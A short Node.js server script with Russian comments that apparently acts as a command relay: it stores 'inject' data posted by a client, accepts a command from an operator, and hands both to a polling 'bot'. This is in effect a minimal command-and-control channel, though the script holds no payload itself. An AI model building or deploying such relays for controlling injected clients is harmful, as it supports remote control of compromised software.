const http = require('http');

let lastCommand = "";
let lastInjectData = null; // Храним данные последнего инжекта

const server = http.createServer((req, res) => {
  // POST /inject - данные при инжекте
  if (req.url === '/inject' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      lastInjectData = JSON.parse(body); // Сохраняем данные
      res.writeHead(200);
      res.end("OK");
    });
    return;
  }

  // POST /command - установка команды
  if (req.url === '/command' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      lastCommand = JSON.parse(body).command;
      res.writeHead(200);
      res.end("OK");
    });
    return;
  }

  // GET /data - для бота (команды + инжекты)
  if (req.url === '/data' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      command: lastCommand,
      injectData: lastInjectData
    }));
    lastCommand = ""; // Очищаем команду
    return;
  }

  res.writeHead(404);
  res.end("Not Found");
});

server.listen(process.env.PORT || 3000);
